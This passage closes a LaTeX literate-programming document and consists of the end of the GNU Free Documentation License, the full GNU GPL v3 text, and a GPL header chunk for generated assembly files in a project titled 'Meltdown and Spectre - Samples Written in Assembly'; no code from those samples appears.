A compilation of the Document or its derivatives with other separate
and independent documents or works, in or on a volume of a storage or
distribution medium, is called an "aggregate" if the copyright
resulting from the compilation is not used to limit the legal rights
of the compilation's users beyond what the individual works permit.
When the Document is included in an aggregate, this License does not
apply to the other works in the aggregate which are not themselves
derivative works of the Document.

If the Cover Text requirement of section 3 is applicable to these
copies of the Document, then if the Document is less than one half of
the entire aggregate, the Document's Cover Texts may be placed on
covers that bracket the Document within the aggregate, or the
electronic equivalent of covers if the Document is in electronic form.
Otherwise they must appear on printed covers that bracket the whole
aggregate.


8. TRANSLATION

Translation is considered a kind of modification, so you may
distribute translations of the Document under the terms of section 4.
Replacing Invariant Sections with translations requires special
permission from their copyright holders, but you may include
translations of some or all Invariant Sections in addition to the
original versions of these Invariant Sections.  You may include a
translation of this License, and all the license notices in the
Document, and any Warranty Disclaimers, provided that you also include
the original English version of this License and the original versions
of those notices and disclaimers.  In case of a disagreement between
the translation and the original version of this License or a notice
or disclaimer, the original version will prevail.

If a section in the Document is Entitled "Acknowledgements",
"Dedications", or "History", the requirement (section 4) to Preserve
its Title (section 1) will typically require changing the actual
title.


9. TERMINATION

You may not copy, modify, sublicense, or distribute the Document
except as expressly provided under this License.  Any attempt
otherwise to copy, modify, sublicense, or distribute it is void, and
will automatically terminate your rights under this License.

However, if you cease all violation of this License, then your license
from a particular copyright holder is reinstated (a) provisionally,
unless and until the copyright holder explicitly and finally
terminates your license, and (b) permanently, if the copyright holder
fails to notify you of the violation by some reasonable means prior to
60 days after the cessation.

Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, receipt of a copy of some or all of the same material does
not give you any rights to use it.


10. FUTURE REVISIONS OF THIS LICENSE

The Free Software Foundation may publish new, revised versions of the
GNU Free Documentation License from time to time.  Such new versions
will be similar in spirit to the present version, but may differ in
detail to address new problems or concerns.  See
https://www.gnu.org/licenses/.

Each version of the License is given a distinguishing version number.
If the Document specifies that a particular numbered version of this
License "or any later version" applies to it, you have the option of
following the terms and conditions either of that specified version or
of any later version that has been published (not as a draft) by the
Free Software Foundation.  If the Document does not specify a version
number of this License, you may choose any version ever published (not
as a draft) by the Free Software Foundation.  If the Document
specifies that a proxy can decide which future versions of this
License can be used, that proxy's public statement of acceptance of a
version permanently authorizes you to choose that version for the
Document.

11. RELICENSING

"Massive Multiauthor Collaboration Site" (or "MMC Site") means any
World Wide Web server that publishes copyrightable works and also
provides prominent facilities for anybody to edit those works.  A
public wiki that anybody can edit is an example of such a server.  A
"Massive Multiauthor Collaboration" (or "MMC") contained in the site
means any set of copyrightable works thus published on the MMC site.

"CC-BY-SA" means the Creative Commons Attribution-Share Alike 3.0 
license published by Creative Commons Corporation, a not-for-profit 
corporation with a principal place of business in San Francisco, 
California, as well as future copyleft versions of that license 
published by that same organization.

"Incorporate" means to publish or republish a Document, in whole or in 
part, as part of another Document.

An MMC is "eligible for relicensing" if it is licensed under this 
License, and if all works that were first published under this License 
somewhere other than this MMC, and subsequently incorporated in whole or 
in part into the MMC, (1) had no cover texts or invariant sections, and 
(2) were thus incorporated prior to November 1, 2008.

The operator of an MMC Site may republish an MMC contained in the site
under CC-BY-SA on the same site at any time before August 1, 2009,
provided the MMC is eligible for relicensing.


ADDENDUM: How to use this License for your documents

To use this License in a document you have written, include a copy of
the License in the document and put the following copyright and
license notices just after the title page:

    Copyright (c)  YEAR  YOUR NAME.
    Permission is granted to copy, distribute and/or modify this document
    under the terms of the GNU Free Documentation License, Version 1.3
    or any later version published by the Free Software Foundation;
    with no Invariant Sections, no Front-Cover Texts, and no Back-Cover Texts.
    A copy of the license is included in the section entitled "GNU
    Free Documentation License".

If you have Invariant Sections, Front-Cover Texts and Back-Cover Texts,
replace the "with...Texts." line with this:

    with the Invariant Sections being LIST THEIR TITLES, with the
    Front-Cover Texts being LIST, and with the Back-Cover Texts being LIST.

If you have Invariant Sections without Cover Texts, or some other
combination of the three, merge those two alternatives to suit the
situation.

If your document contains nontrivial examples of program code, we
recommend releasing these examples in parallel under your choice of
free software license, such as the GNU General Public License,
to permit their use in free software.
\end{Verbatim}

\section{Code License}

\subsection{GNU GENERAL PUBLIC LICENSE}

This license applies to all program code generated from this document.

\begin{Verbatim}[fontsize=\small]
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<http://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<http://www.gnu.org/philosophy/why-not-lgpl.html>.
\end{Verbatim}

\subsection{Code Chunk of GPL}

This is a code chunk to be included by the generated asm files.

<<license>>=
;   Meltdown and Spectre - Samples Written in Assembly
;   Copyright (C) 2018 U. Plonus
;
;   This program is free software: you can redistribute it and/or modify
;   it under the terms of the GNU General Public License as published by
;   the Free Software Foundation, either version 3 of the License, or
;   (at your option) any later version.
;
;   This program is distributed in the hope that it will be useful,
;   but WITHOUT ANY WARRANTY; without even the implied warranty of
;   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;   GNU General Public License for more details.
;
;   You should have received a copy of the GNU General Public License
;   along with this program.  If not, see <http://www.gnu.org/licenses/>.
@

@
\end{document}
